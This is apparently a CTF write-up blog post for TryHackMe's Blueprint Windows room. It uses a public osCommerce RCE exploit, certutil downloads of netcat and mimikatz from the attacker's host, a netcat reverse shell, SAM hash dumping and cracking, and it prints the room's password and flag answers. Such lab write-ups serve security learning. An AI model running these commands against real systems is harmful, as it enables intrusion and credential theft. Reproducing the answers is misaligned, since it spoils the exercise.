---
layout: post
title: Blueprint
date: 2023-03-09 12:00 +0700
categories: [THM, easy]
---

### Introduction

[Blueprint] is an easy Windows CTF machine on TryHackMe.
I completed the machine without using metasploit, but you can use It to completed too.

![blueprint](https://tryhackme-images.s3.amazonaws.com/room-icons/90243c256ba1d4eb403bc206e376f238.jpeg)



---

Let's start scanning the machine with nmap.

```sh
nmap -sSV -p- -open --min-rate 5000 <IP> -oN <outputfile.txt>
```

We can see like is normal in Windows machines to have a lot of ports open.

![Scan](/images/THM/blueprint/Captura.PNG)

This time we are going to focus on the web because we can't see the SMB service as a guest.

If we go to the web server hosted in port 8080, we can find there is an **OsCommerce** hosted.

![Web](/images/THM/blueprint/Captura2.PNG)

Researching a little, we can find that there is an exploit for the version is hosting the machine.

The [exploit] is the RCE type and *exploit the install.php finish process by injecting php payload into the db_database parameter & read the system command output from configure.php*

![exploit search](/images/THM/blueprint/Captura3.PNG)

So let's try to download it and run it.

```sh
python3 osCommerce2_3_4RCE.py http://<IP>:8080/osCommerce2_3_4/catalog/
```

We can see that it work and we got a shell.

![exploit execution](/images/THM/blueprint/Captura4.PNG)

Let's upgrade our shell!

For that, we will upload netcat executable to execute It and get a reverse shell. We will do It with the in-built Windows command **certutil** to download the executable from our machine.

For serve the binary, we will open a python web server.

```sh
certutil -urlcache -f http//<OUR IP>/<nc or ncat binary> <binary same name>
dir
```

![ncat download](/images/THM/blueprint/Captura6.PNG)

And we will do the same with mimikatz executable.

[Mimikatz] is a tool that extracts passwords stored in memory, among other things.

```sh
certutil -urlcache -f http//<OUR IP>/mimikatz.exe mimikatz.exe
```

![mimikatz download](/images/THM/blueprint/Captura7.PNG)

Time to get our interactive reverse shell.

```sh
nc.exe/ncat.exe <OUR IP> <PORT> -e cmd
```

![revshell](/images/THM/blueprint/Captura8.PNG)

And now we can execute mimikatz to extract the password from the user **Lab**.

```sh
mimikatz.exe
```

![mimikatz](/images/THM/blueprint/Captura9.PNG)

To do that we will be using **lsadump:sam** and this command will dump the users passwords hash.

```sh
lsadump::sam
```

![Hashdump](/images/THM/blueprint/Captura10.PNG)

Again like in other WriteUps I will be using [crackstation] to crack the password.

![cracked password](/images/THM/blueprint/Captura11.PNG)

- "Lab" user NTML hash decrypted
>Answer: googleplus

```sh
dir C:\Users\Administrator\Desktop
type C:\Users\Administrator\Desktop\root.txt.txt
```

We can go to the Administrator folder and show the flag.

With this we've completed the machine.

![root flag](/images/THM/blueprint/Captura5.PNG)

- root.txt
>Answer: THM{aea1e3ce6fe7f89e10cea833ae009bee}

 [blueprint]: https://tryhackme.com/room/blueprint
 [crackstation]:https://crackstation.net/
 [exploit]:https://github.com/nobodyatall648/osCommerce-2.3.4-Remote-Command-Execution
 [mimikatz]:https://github.com/gentilkiwi/mimikatz
